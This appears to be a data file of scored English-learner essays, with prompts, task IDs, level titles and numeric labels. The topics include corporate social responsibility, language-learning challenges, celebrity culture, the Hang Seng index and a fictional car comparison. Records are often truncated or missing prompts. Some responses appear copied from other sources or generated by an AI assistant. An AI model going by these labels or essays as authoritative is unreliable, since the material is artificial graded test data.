Be sure to polish your work before you submit it. Type in the input box. Write 150-200 words. [SEP] Response: Exploring the Charms of Tokyo and Chennai\n\nTokyo, Japan, is a city that never sleeps, a bustling metropolis that dazzles with neon lights, towering skyscrapers, and an inexhaustible supply of technology and innovation. The city's efficient public transportation, particularly the extensive network of trains and subways, makes commuting a breeze for residents and visitors alike. Tokyo's culinary scene is unparalleled, offering everything from Michelin-starred sushi restaurants to humble ramen shops, ensuring a gastronomic adventure at every corner. The blend of traditional and modern is apparent in Tokyo, where ancient temples stand tall amidst futuristic buildings. The seamless integration of nature, such as the beautiful cherry blossoms in Ueno Park, adds to Tokyo's unique charm.\n\nIn contrast, Chennai, India, embodies a different kind of allure. Known for its rich cultural heritage, Chennai is a city where history and tradition are deeply embedded in its way of life. The bustling markets, vibrant festivals, and classical music and dance performances reflect the city's cultural richness. Chennai's Marina Beach, one of the longest urban beaches in the world, offers a serene escape from the urban hustle. The city's warm, tropical climate and the mouthwatering South Indian cuisine, including dishes like dosa and idli, add to its appeal. Unlike Tokyo's rapid pace, Chennai moves at a more relaxed and laid-back rhythm, allowing its residents to enjoy life at a leisurely pace.\n\nWhile Tokyo mesmerizes with its futuristic vibe and fast-paced lifestyle, Chennai captivates with its cultural depth and relaxed atmosphere. Both cities, despite their differences, offer unique experiences that make them truly special.", "task_id": "bdd2883c-b71b-4fb7-a44c-a53e7bbf26f4", "level_title": "15-Advanced", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language students often face a variety of challenges that can complicate their learning progress. One common issue is vocabulary memorizing. Learners may struggle to remember new words, especially if they are not exposed to them regularly. This leads to limited communication skills and a lack of confidence.\n\nAnother challenge is pronunciation. Different languages have unique sounds that may not exist in a student’s native tongue, making it difficult to pronounce words correctly.\n\nGrammar can also difficult. The rules of sentence structure, tenses, and articles vary widely across languages.\n\nA major hurdle is motivation. Language learning is often a slow process, and many students may feel frustrated or discouraged when they don’t see immediate results. They may also lack opportunities for real-world practice, making it harder to apply what they’ve learned in authentic conversations.\n\nTo overcome these challenges, learner must stay patient, practice regularly, and seek immersive experiences, such as speaking with native speakers or consuming content in the target language.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 3}

I’m excited to introduce you to a company with not just global reach, but a truly inspiring story at its heart.\n\nLet’s start at the beginning. Frisko Shipping was founded in 2001 by Bill Frisko — a man whose story is as unforgettable as it is unexpected. While on vacation, he fell into the ocean and was bitten by a shark. But instead of despair, he found inspiration. A passing ship rescued him, and in that moment, Bill decided to build something of his own — a shipping company that would one day operate in 20 cities across the globe, employ over 5,000 people, and control 10 percent of the global shipping market. Last year alone, we made a profit of 5 million dollars.\n\nNow, that didn’t happen overnight. It took vision, hard work, and a motivated team. That’s where you come in. As new members of Frisko, we expect you to bring enthusiasm, energy, and a willingness to grow. You’re not just joining a company — you’re joining a journey.\n\nBefore we continue, we’ll kick things off with a quick quiz — just to see what you already know about Frisko!\n\nAnd finally, I’ll leave you with this: What could inspire you today — and where could it lead you tomorrow? Whatever your answer is, start working toward it now.\n\nThank you — and welcome aboard!\n", "task_id": "5c89b5ef-f9e4-44c0-bd77-31ed1d856ff0", "level_title": "Presentations", "label": 5}

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: I strongly believe that companies do have a responsibility to society, and this responsibility goes beyond simply making profits for their shareholders. Corporations operate within communities, and their actions have a direct impact on the well-being of those communities. It's not enough to focus solely on financial gains; companies should also contribute to the social and environmental health of the areas where they do business. Corporate Social Responsibility (CSR) can lead to long-term success, as it fosters goodwill, attracts loyal customers, and enhances a company’s public image.\n\nFor example, when companies adopt sustainable practices, they not only protect the environment but also ensure future resources and maintain their reputation. Similarly, offering fair employee benefits promotes job satisfaction, reduces turnover, and increases productivity. Companies that act in the best interests of both their shareholders and society are more likely to thrive in the long run. The company became an essential part of the society environment. \n\nWhile critics argue that CSR can be a mere marketing tool or that the government should handle societal issues, I believe that companies, as integral parts of society, have a moral duty to contribute positively. By doing so, they can create a more sustainable future for all, and in the process, they benefit from customer loyalty and a motivated workforce. In this way, the interests of society and business are not mutually exclusive but can align for mutual benefit.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

The foreman handed a hung-jury message to the marshal to take to the judge, but he instructed the jury to keep deliberating.\n\nIn the end, on February 18, 1970, all seven defendants were found not guilty on the conspiracy charges, two were acquitted completely, and five were convicted of inciting to riot.

The convictions were all reversed on appeal by the United States Court of Appeals for the Seventh Circuit on November 21, 1972. The reasons for the reversal involved bias by the judge and his refusal to permit defense attorneys to question prospective jurors regarding cultural bias.

Attached to the wings are ailerons and flaps, which control the plane's roll and lift, respectively.\nThe tail section includes the horizontal stabilizer and vertical stabilizer, helping maintain balance and control. The rudder, on the vertical stabilizer, manages yaw (left and right movement), while the elevator on the horizontal stabilizer controls pitch (up and down movement).\nAt the front of the aircraft, the engines provide thrust, propelling the airplane forward. Modern jets use turbine engines for this purpose. Finally, the landing gear supports the airplane during takeoff, landing, and ground operations, retracting into the fuselage during flight to reduce drag. Together, these components enable safe and efficient air travel.", "task_id": "65f455e8-4b01-40fd-bff6-0cb906d6006e", "level_title": "Aviation", "label": 5}

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate Social Responsibility: A Moral and Strategic Imperative\n\nCorporate social responsibility (CSR) is not just a moral obligation—it is a strategic imperative in today’s interconnected and socially conscious world. Companies are no longer isolated entities existing solely to maximize shareholder profits. They operate within societies, rely on local communities for labor and resources, and depend on consumer trust to thrive. Therefore, they must also contribute meaningfully to those communities and uphold sustainable, ethical practices.\n\nCritics often invoke Milton Friedman’s view that the sole purpose of business is profit. While profit is essential, this narrow interpretation is outdated in the context of modern capitalism. CSR and profitability are not mutually exclusive. Companies that prioritize fair labor practices, environmental sustainability, and community engagement often see improved employee satisfaction, customer loyalty, and brand value. As Jack@MSU rightly pointed out, CSR contributes to the bottom line because consumers increasingly care about corporate values.\n\nFurthermore, leaving all social responsibility to governments ignores the immense power and influence multinational corporations now wield. Regulations are necessary but insufficient. Corporations must go beyond compliance and actively invest in social and environmental causes if they wish to remain credible and relevant.\n\nUltimately, responsible corporate behavior should not be viewed as charity or mere marketing. It is a reflection of long-term thinking and ethical stewardship in a rapidly changing world.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

Use the notes to help you. Write 100-150 words. [SEP] Response: **Intrinsic and climatic factors in North-American animal population dynamics\n\nBy Nicolas Loeuille and Michael Ghil**\n\nAbstract\nExtensive work has been done to identify and explain multi-year cycles in animal populations. Several attempts have been made to relate these to climatic cycles. We used advanced time series analysis methods to attribute cycles in several North-American mammal species to abiotic versus biotic factors. Our results show that all three climatic indices influence the animal-population dynamics: they explain a substantial part of the variance in the fur-counts and share characteristic periods with the fur-count data set. In addition to the climate-related periods, the fur-count time series also contain a significant three-year period that is, in all likelihood, caused by biological interactions.\n\nTerms of Reference\nThe dynamics of animal populations are driven by both biotic and abiotic factors. Following the seminal work of Volterra [1], many models assume that direct interactions between species, such as predation, competition or mutualism, play a dominant role in population dynamics. The key role of such biotic factors need not exclude other potentially important processes. Abiotic factors that are likely to play a significant role in the dynamics of an animal community include the climatic, physical and chemical conditions in which the different populations live.\n\nThis work aims at separating the influence of biotic and climatic factors in the dynamics of eleven North-American mammal populations. The animal species we studied were bear, beaver, fisher, fox, lynx, marten, mink, muskrat, otter, wolf and wolverine. The variations in these populations are determined by using the Hudson Bay Company's database of annual fur-counts [2].\n\nMethodology\nFour different data sets were analyzed. The first set includes fur-counts of the eleven animal populations within a given year. The three other sets were obtained by augmenting the fur records by one climatic record in each case. The three records we used were the North Atlantic Oscillation (NAO) index, the cold-season Nino-3 sea-surface temperatures (SSTs), and the mean surface-air temperature of the Northern Hemisphere.\n\nConclusions\nOur two-step methodology led us to distinguish between intrinsic and external factors in the dynamics of over ten North American mammal populations. PC analysis shows that internal dynamics is most important but also captures the role of ENSO, NAO and NH temperatures in the animal population dynamics. The striking change in the amplitude of the oscillations present in our fur-count data is probably linked to an increase of hunting pressure over the century-long interval of study.\n\nAcknowledgements\nThis work was initiated as part of a collaboration between the Ecole Normale Superieure and UCLA. We thank both institutions for their respective support and mutual hospitality.

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Challenges in Language Learning\n\nLearning a new language is exciting, but it comes with many challenges. One common issue is lack of confidence. Many students are afraid to make mistakes, especially when speaking. This fear can prevent them from practicing, which is essential for improvement. Asking yourself, “What’s the worst that could happen if I say it wrong?” can help reduce this anxiety.\n\nAnother challenge is vocabulary overload. Students often try to memorize too many words at once, which can feel overwhelming. Instead, it’s better to learn new words in context and review them regularly.\n\nListening comprehension is also difficult, especially when native speakers talk fast or use slang. To improve, learners should expose themselves to different accents and real-life conversations, like podcasts or TV shows.\n\nFinally, staying motivated can be tough. Progress in language learning is slow, and many students get discouraged. Setting small, realistic goals—like learning 5 new words a day—can help you stay on track.\n\nIn short, language learning takes time, patience, and practice. If you stay positive and keep trying, the results will come. What’s one small step you can take today to improve your language skills?\n\n", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Although I admire talent and dedication, I feel compelled to criticize the idea of celebrity culture in general, especially how it often promotes superficial values over genuine substance. To begin with, one major criticism is that many celebrities are celebrated more for their appearance and curated lifestyles than for any meaningful contribution to society. While it’s true that some use their fame to raise awareness for important causes, it’s disappointing that the media still tends to reward scandal and controversy instead of integrity and hard work. Another point worth mentioning is that celebrity culture fuels unrealistic expectations, particularly for young people. It encourages people to compare themselves constantly, which can lead to low self-esteem and even mental health issues. I’m not saying that all celebrities are to blame, but the system as a whole is problematic. It would be better if we shifted our focus from idolizing people for their wealth or status to valuing those who make a real difference in their communities. In short, the obsession with celebrities is, in my opinion, rather unhealthy. It would be more beneficial for society if we celebrated kindness, creativity, and authenticity instead of fame for fame’s sake.\n", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: I dislike celebrities who use other celebrities to gain popularity. And I dislike influencers marketing in that sense: if people want to be in media, they should portrait who they really are, not to hide themselves into a fake person, acting and performing as a personage in media. \n\nI remember when Kendall Jenner used to \"date\" a rapper. For me it was only about to give him promotion, and make him globally popular and known. His fans would argue that he is bigger than Kendall Jenner, and the fame giving would be for her. But even that, this should not happen. \n\nSome celebrities believe that they are bigger than they are, and this is due to the fact that silly people puts them in a special place, like if they would do something important for the develop of the civilization. I believe that entertainment is important, and we should see celebrities like that, like entertainers.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: The whole idea of celebrity culture often deserves criticism for being excessively superficial and occasionally misleading. One major drawback is the obsession with appearances and wealth, which can promote unrealistic standards and encourage materialism. It’s fair to say that this culture tends to exaggerate success while glossing over effort, failure, or genuine character development. Moreover, celebrities are frequently praised for simply being visible, rather than for meaningful contributions or expertise.\nTake social media influencers, for example. While some bring creativity and positive influence, others have been rightly criticized for spreading misinformation or promoting unhealthy lifestyles. It seems increasingly common for fame to be valued over substance. This can be damaging, particularly to impressionable audiences who may view celebrity status as the ultimate achievement, regardless of how it's attained.\nWhile I acknowledge that some celebrities use their platform responsibly, it’s hard to ignore the fact that the system itself encourages narcissism and prioritizes visibility over integrity. We should question this structure more often and celebrate values that go beyond the spotlight.\n", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

There weren’t parties like we know today, but cakes were prepared and offers were made. Then, the habits of wishing happy birthday, giving gifts and lighting candles became popular as a way to protect the birthday person from devils and ensure good things to the next year in the person’s life. The celebrations only became popular like we know today after fourteen centuries, in a collective festival performed in Germany\n\nDepartment Stores\nThe first department store was created in Paris, in 1850.

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: You are writing to Harry, a new manager in your company. He wants advice on how to effectively motivate his team and what strategies to avoid. Use the language and strategies you have learned in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: To create a motivated, engaged, and productive workforce, it is vital for leaders to take a strategic approach that aligns employees' personal and professional growth with the company's goals. By incentivizing employees and linking their success directly to the company's achievements, managers can create a sense of ownership and motivation, where individuals feel that their contributions directly impact their rewards and overall success. Additionally, taking an active interest in employees' career development and offering mentorship opportunities fosters a deeper connection between the individual and the organization, ensuring they feel supported in their professional journey. Providing opportunities for ongoing training and skill development ensures that employees are equipped with the tools they need to thrive, creating a culture of continuous improvement. It's equally important to promote a healthy work-life balance by recognizing that employees have lives outside of the workplace, and showing empathy toward their personal commitments will build loyalty and well-being. Listening actively to employees, especially when they raise concerns or express dissatisfaction, not only helps to address potential issues early on but also fosters a culture of trust where employees feel heard and valued. Acknowledging their contributions, celebrating their achievements, and giving credit where it's due motivates individuals to perform at their best. On the flip side, behaviors that demotivate employees, such as disrespecting them, taking credit for their work, losing one's temper, unfairly placing blame, or failing to provide recognition for good work, can severely harm morale, leading to disengagement and decreased productivity. It's essential to remember that the actions and attitudes of leadership directly influence the overall atmosphere within a company, and creating a positive, supportive, and respectful environment is the foundation for achieving long-term success.", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 5}

Here's a sample article based on a typical performance trend of the Hang Seng Index (HSI). If you provide your specific notes or graph, I can tailor it precisely. For now, here is a general 150–200 word article:\n\n\n---\n\nHang Seng Index Shows Signs of Recovery Amid Global Uncertainty\n\nThe Hang Seng Index (HSI), Hong Kong’s key benchmark for blue-chip stocks, has experienced a volatile yet promising performance over the past quarter. After starting the year with sharp declines due to lingering concerns over China’s economic slowdown and global inflationary pressures, the index began to rebound in late May.\n\nDriven by renewed investor confidence, tech sector gains, and government stimulus efforts, the HSI climbed nearly 8% in June, marking its strongest monthly performance in over a year. Notably, major players such as Tencent and Alibaba saw significant upticks, helping to lift overall market sentiment.\n\nDespite this recovery, analysts urge caution. Ongoing geopolitical tensions, sluggish property sector growth, and cautious consumer spending continue to weigh on investor outlook. However, the HSI’s recent upward trend suggests a potential turning point for Hong Kong’s financial markets.\n\nLooking ahead, sustained policy support from Beijing and improvements in global trade could further stabilize the index. For now, the Hang Seng is cautiously regaining ground, offering investors a glimpse of optimism amid ongoing global economic challenges.\n\n\n---\n\nLet me know if you’d like this adjusted based on specific data points or a graph you have!\n\n", "task_id": "4f8d4d8b-f672-41b5-bf06-5a975187563a", "level_title": "Construction", "label": 0}

I had an idea that a person about to open an account must needs consult the manager.\n\nI went up to a wicket marked \"Accountant.\" The accountant was a tall, cool devil. The very sight of him rattled me. My voice was sepulchral.\n\n\"Can I see the manager?\" I said, and added solemnly, \"alone.\" I don't know why I said \"alone.\"\n\n\"Certainly,\" said the accountant, and fetched him.\n\nThe manager was a grave, calm man.

He felt that I had an awful secret to reveal.\n\n\"Come in here,\" he said, and led the way to a private room. He turned the key in the lock.\n\n\"We are safe from interruption here,\" he said; \"sit down.\"\n\nWe both sat down and looked at each other.

I have come to open an account. I intend to keep all my money in this bank.\"\n\nThe manager looked relieved but still serious; he concluded now that I was a son of Baron Rothschild or a young Gould.\n\n\"A large account, I suppose,\" he said.\n\n\"Fairly large,\" I whispered. \"I propose to deposit fifty-six dollars now and fifty dollars a month regularly.\"\n\nThe manager got up and opened the door.

Type in the input box. Write 150-200 words. [SEP] Response: After evaluating two training companies, TrainQuick and Skills Pro, I have compiled the findings and recommend proceeding with Skills Pro for our employee training needs. TrainQuick offers an affordable and flexible training solution, but it has several drawbacks. Despite its cost-effectiveness, TrainQuick has seen low engagement across different branches, with employees expressing dissatisfaction about being grouped with individuals from other branches. This could potentially hinder the effectiveness of the training, as employees are not fully engaged in a mixed-class environment. These factors suggest that while TrainQuick may be cost-efficient, it may not fully meet our needs in terms of quality and employee satisfaction.\n\nOn the other hand, Skills Pro, while more expensive, offers a more rigorous and effective training program. Though some employees have found the content challenging, those who complete the course tend to finish successfully, indicating the quality and depth of the material. Additionally, Skills Pro has plans to expand its course offerings, which aligns with our commitment to continuous employee development and staying ahead of industry trends. The higher cost is a consideration, but given the strong track record of successful completions and the potential for future course expansion, the investment is likely to pay off in terms of improved employee skills and performance.\n\nGiven these points, I recommend that we proceed with Skills Pro. While it requires a higher financial commitment, the quality of training and the successful outcomes justify the additional expense. I believe this choice will contribute to the long-term development of our team and provide a solid foundation for achieving our organizational goals.\n\n\n", "task_id": "28757296-8797-428f-a562-0b03c304b341", "level_title": "14-Advanced", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: I’ve talked about how I first learned to give and receive constructive criticism while an undergraduate in art school. While this formal training in feedback has served me well in my personal and professional life, one thing I didn’t fully grasp until I was older and more experienced was how to recognize and respond to destructive criticism. We’ve all encountered these subtle and not-so-subtle personal attacks at school, at work, and in our personal lives, and responding without losing your cool can be daunting. In this third installment of my criticism trilogy, I want to discuss how to recognize destructive criticism, protect yourself and respond gracefully and professionally.\n\nConstructive vs. Destructive Criticism\nConstructive criticism aims to help someone improve in a particular area and is supported by specific examples and delivered in a considerate and compassionate manner. Destructive criticism is negative feedback that is often incorrect, unsolicited, or downright malicious and can undermine, harm, or even destroy someone’s work, reputation, or self-esteem. Unfortunately, people who engage in these personal attacks usually don’t offer specific or actionable advice for improvement and often do so publicly to humiliate or degrade someone. Let’s examine the four components of criticism:\n\nIntent: The meaning or the purpose underlying the critique.  \n\nDelivery: The way the critique is delivered: tone of voice, word choice, body language.\n\nFocus: The focal point or emphasis of the critique", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 0}

Persuade your design team to choose one of the designs for next year’s rollout. Write 100-150 words. [SEP] Response: Our company propose two models of Geothermal Fluxcapacitor for next year's rollout. The main difference between them is the fuel type: XZ3 is gasoline powered, whereas E-XZ3 is hydrogen powered.\n\nBoth models are equipped with all-aluminum V8 engine. However for model E-XZ3 it's slightly smaller, only 5.4 liters, than for XZ3 (6.4 liters). It results in longer zero to 60 mph time for E-XZ3, equals 5.7 s, than for XZ3, which can accelerate so within 2.7 s only.

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Learning a new language can be an exciting but challenging experience. Many students face difficulties that can affect their motivation and progress. What are the most common obstacles in language learning? One of the biggest challenges is fear of making mistakes. Students often feel embarrassed when they pronounce words incorrectly or use the wrong grammar. This fear can prevent them from speaking and practicing, which is essential to improve.\n\nAnother issue is staying consistent. Language learning requires regular practice, but many students struggle to find time or lose motivation over time. How can students overcome this? Setting small, achievable goals and making language learning part of a daily routine can help.\n\nAdditionally, students may struggle with understanding native speakers due to fast speech or unfamiliar accents. Watching movies, listening to music, and having conversations with native speakers can improve listening skills.\n\nFinally, lack of exposure to real-life language use is another problem. Classroom learning is important, but it's not enough. Immersing oneself in the language, through travel or language exchange, can make a big difference.\n\nIn conclusion, while language learning has its difficulties, students can succeed by practicing regularly, overcoming fear, and seeking opportunities for real-world use.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

{"text": "Prompt Level: Banking and Finance [SEP] Prompt: You are a journalist for a financial magazine. You've been asked by your editor to write a report on the performance of the Hang Seng (HSI) stock market index. You have some notes and a graph as your guide. Write an article of 150-200 words, making it as accurate and interesting as possible. [SEP] Response: As of November 2024, the Hang Seng Index at the Hong Kong Exchange amounted to 19,423.61 points. After the outbreak of COVID-19, the index dropped as part of a broader Pan-Asian trend. However, by the end of 2020, when the pandemic situation stabilized in many countries and news about a vaccine rollout came out, the Hang Seng Index recovered and recorded significant increases every month. January 2023, the Hong Kong stock market reached its peak for the year, as hopes for reopening boosted investors’ sentiment. However,\nthe market was on a downward trend for the remainder of the year due to several factors. Initially, uncertainties arising from the US regional\nbanking crisis and the outlook for Federal Reserve rates impacted market confidence. Subsequently, concerns over China’s economy further\nexacerbated the market’s decline. In 2023, the Hang Seng Index (HSI) and the Hang Seng China Enterprises Index (HSCEI) were down by\n13.8% and 14.0% respectively, while the Hang Seng TECH Index (HSTECH) posted a relatively better return of -8.8%. In mainland China’s\nstock market, the Hang Seng China A Industry Top Index and the Hang Seng Stock Connect China A 300 Index declined by 6.0% and 11.6%\nrespectively.\n The HSI Volatility Index (VHSI) and the HSCEI Volatility Index (VHSCEI) surged to their peaks in March and August 2023, as uncertainties\nover the Fed rate and the economic outlook for China dampened market sentiment. Market volatility was in general lower in the year\ncompared to 2022.\n Within the Hang Seng Composite Index (HSCI), large-cap stocks declined by 12.9%, outperforming mid-cap (-15.3%) and small-cap (-24.7%).\nAmong the HSCI industry sub-indexes, Energy was again the best-performing industry, recording an increase of 19.8% following a 17.3%\ngain in 2022, versus Properties & Construction as the worst-performing industry (-30.9%).\n The Hang Seng Corporate Sustainability Index and Hang Seng ESG 50 Index achieved better performance compared to the HSI by 5.5\npercentage points and 3.5 percentage points respectively. The HSI ESG Index and HSCEI ESG Index, which combine the HSI and HSCEI\nwith ESG initiatives respectively, both outperformed their base indexes by 1.7 percentage points and 3.7 percentage points.", "task_id": "5d0a4e6c-37d4-4189-bf76-0ed3cba9ce0a", "level_title": "Banking and Finance", "label": 5}

Persuade your design team to choose one of the designs for next year’s rollout. Write 100-150 words.

With a powerful 6.4-liter gasoline engine and a top speed of 207.1 mph, it offers exceptional performance that will appeal to enthusiasts and high-performance markets. Its slightly longer 107.1-inch wheelbase may also contribute to better stability at high speeds. In contrast, the XZ3-E, while innovative with its hydrogen powertrain, delivers a lower top speed of 159.1 mph and a smaller 5.4-liter engine. Although sustainability is important, hydrogen infrastructure remains limited, which could restrict the vehicle’s adoption.

If a cyberattack hits, or electronics fail mid-voyage, a ship’s only fallback could be those analog tools—and the crew’s ability to use them.\nSome navies and shipping companies use a hybrid approach, leaning heavily on e-nav but requiring proficiency in traditional methods.

Metaphors are powerful tools that can convey complex ideas and emotions through vivid imagery, making abstract concepts more relatable and understandable. They enrich the text and engage readers by drawing parallels between seemingly unrelated things.\n\nFocused free writing is another valuable technique. It allows for the free flow of ideas within a specific topic, helping to overcome writer's block and generate raw material that can be refined later. This method encourages creativity and can lead to unexpected insights and connections that might not emerge through more structured writing approaches.\n\nQuestioning is also essential, as it drives the exploration of a topic. By asking probing questions, writers can delve deeper into their subject matter, uncovering new angles and perspectives. This technique not only aids in developing a thorough understanding of the topic but also helps in structuring the writing logically and coherently.\n\nTogether, these techniques enhance the writing process by fostering creativity, clarity, and depth, making them indispensable tools for any writer.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: A website has invited you to write your opinion on the topic of corporate social responsibility. Read the postings before you begin. Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate social responsibility (CSR) has become a fundamental aspect of modern business practices, reflecting an organization’s commitment to ethical behavior, sustainable development, and the well-being of society. As businesses continue to recognize their influential role in the global landscape, CSR initiatives have emerged as a vital component for fostering trust and building a positive brand image.\n\nOne of the key arguments in favor of CSR is its potential to create shared value for both businesses and communities. By integrating social and environmental considerations into their operations, companies can drive innovation, reduce costs, and open new market opportunities. For instance, sustainable practices such as energy efficiency and waste reduction not only benefit the environment but also result in significant cost savings for businesses.\n\nMoreover, CSR initiatives can enhance a company's reputation and strengthen its relationship with stakeholders, including customers, employees, and investors. Consumers today are increasingly inclined to support brands that align with their values, and a strong CSR strategy can serve as a powerful differentiator in a competitive market. Similarly, employees are more likely to feel motivated and loyal when they work for a company that demonstrates a genuine commitment to social and environmental issues.\n\nHowever, it is crucial for companies to approach CSR authentically, avoiding superficial or insincere efforts commonly referred to as \"greenwashing.\" Transparency and accountability should be at the forefront of any CSR strategy to ensure that businesses truly contribute to societal progress.\n\nIn conclusion, corporate social responsibility is not merely a philanthropic endeavor but a strategic approach that can drive sustainable business success while contributing positively to society. By embracing CSR, companies can play a pivotal role in addressing global challenges while securing their long-term growth and relevance.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: Use the information in the notes to write an informative text about NAFTA, or write about a trade agreement your country is a part of. Type in the input box. Write 150-200 words. [SEP] Response: The North American Free Trade Agreement (NAFTA), involving the United States, Canada, and Mexico, came into effect in January 1994 after years of negotiation. It aimed to eliminate barriers to trade and investment between the member countries, reducing or eliminating customs duties on goods. NAFTA significantly reshaped trade dynamics in North America, fostering closer economic integration.\n\nOne of the most notable impacts of NAFTA has been on agriculture. The agreement facilitated increased trade of agricultural products, with Mexican fruits and vegetables gaining greater access to the U.S. market. This led to a more diverse food supply and competitive prices for consumers. However, the agricultural sector also faced challenges; for instance, some U.S. and Canadian farmers experienced increased competition from Mexican imports.\n\nNAFTA's influence extended beyond agriculture, affecting various industries by encouraging cross-border investments and supply chain integration. While it spurred economic growth and job creation in some sectors, NAFTA also faced criticism for contributing to job losses in manufacturing, particularly in the U.S., as companies relocated operations to Mexico for lower labor costs.\n\nDespite these mixed outcomes, NAFTA is generally seen as beneficial to all three member countries, enhancing trade flows and economic cooperation, and laying the groundwork for future trade agreements like the United States-Mexico-Canada Agreement (USMCA) that replaced it in 2020.\n", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 5}

Following the successful completion of the probationary term of employment as outlined in paragraph 4, Party A may terminate the employment of Party B at any time, provided such termination is in compliance with applicable laws regarding discrimination:\n\n(a) For just cause at common law: In this case, Party B is not entitled to any advance notice of termination or compensation in lieu of notice. Just cause includes, but is not limited to, instances of gross misconduct or violations of the law, excluding any actions that could be deemed discriminatory or in violation of protected characteristics, including but not limited to race, gender, age, sexual orientation, disability, religion, or any other status protected by applicable law.\n\n(b) Without just cause: In this case, Party A shall provide Party B with advance notice of termination or compensation in lieu of notice equal to one month, plus two weeks for each full year of service with Party A, up to a maximum of fifteen (15) months. This provision shall not be invoked in circumstances where termination may be construed as discriminatory based on Party B's protected characteristics.\n\n7.2. Party B may terminate his employment at any time by providing Party A with at least eight (8) weeks' advance notice of his intention to resign. This notice period may be adjusted in cases where the termination is a response to discriminatory practices or a hostile work environment, as defined by applicable discrimination laws.\n\nComparison with the Original Model:\n\nThe revised section retains the original structure and stipulations regarding termination but explicitly incorporates protections against discrimination for both parties. It emphasizes that just cause cannot include grounds that could be considered discriminatory and affirms that termination without cause should also respect the principles of non-discrimination. Additionally, it allows for flexibility in the resignation notice period if the employee's decision to leave is prompted by discriminatory practices, thus promoting a fair and equitable workplace.", "task_id": "c2b11467-88a4-414c-b759-f88079c5b4d5", "level_title": "Law", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Challenges in Language Learning\n \nLearning a new language is an exciting yet challenging journey. Many students face difficulties that make the process frustrating at times. One major challenge is pronunciation. Some sounds in a new language may not exist in a learner’s native tongue, making them hard to produce correctly. This can lead to misunderstandings in conversations.\n \nAnother issue is vocabulary retention. Memorizing new words is not enough; learners need to use them regularly to truly remember them. Without practice, words are easily forgotten. Similarly, grammar rules can be overwhelming. Every language has its own structure, and making mistakes is common. Some learners feel discouraged when they struggle to form correct sentences.\n \nConfidence and fear of making mistakes also hold many students back. Speaking in a new language can be intimidating, especially in front of native speakers. The fear of being judged often prevents learners from practicing, which slows down progress.\n \nLastly, consistency is key, but many students struggle to stay motivated. Without regular practice, improvement is slow. Finding engaging ways to learn—such as watching movies, speaking with native speakers, or using language apps—can make the process more enjoyable.\n \nDespite these challenges, persistence and practice lead to success. Every mistake is part of the learning journey, and with time, confidence grows.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

However, at the end of the half-year, the index fell to a level of almost 21,000, before recovering to a value of 27,500 by the end of the year.

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: In my opinion, companies absolutely have a responsibility to society. Businesses do not operate in a vacuum—they are part of the social and environmental ecosystems where they function. Therefore, they should not focus solely on profits for shareholders but also consider the wider impact of their activities.\n\nFirst, companies rely on local communities for workers, customers, and infrastructure. Ignoring these communities while profiting from their resources is unethical. Supporting social projects, ensuring fair wages, and promoting sustainability are ways for businesses to give back. This mutual relationship builds trust and long-term success.\n\nSecond, corporate social responsibility is not just ethical—it’s also smart business. As Jack@MSU pointed out, companies with a strong CSR profile often enjoy better customer loyalty. Consumers today are more aware and prefer to support brands that reflect their values. This translates into long-term financial success.\n\nOpponents argue that a company’s only responsibility is to increase profits, as Milton Friedman suggested. But in the modern world, this view is outdated. Profit and social responsibility are not mutually exclusive. A company that treats people and the planet well is more likely to thrive sustainably.\n\nIn conclusion, businesses should embrace CSR not just because it’s the right thing to do, but because it aligns with long-term profitability and public trust", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

[SEP] Response: Report on Car Designs: Geothermal Fluxcapacitor XZ3 6.4-Liter vs. Geothermal Fluxcapacitor XZ3 5.4-Liter\n\nAfter evaluating the two car designs, the Geothermal Fluxcapacitor XZ3 6.4-Liter V8 engine stands out as the superior choice for next year’s rollout. This model offers a more powerful 6.4-liter V8 engine compared to the 5.4-liter engine in the alternative design. It achieves zero to 60 mph in just 2.7 seconds, significantly faster than the 5.7 seconds of the 5.4-liter model.

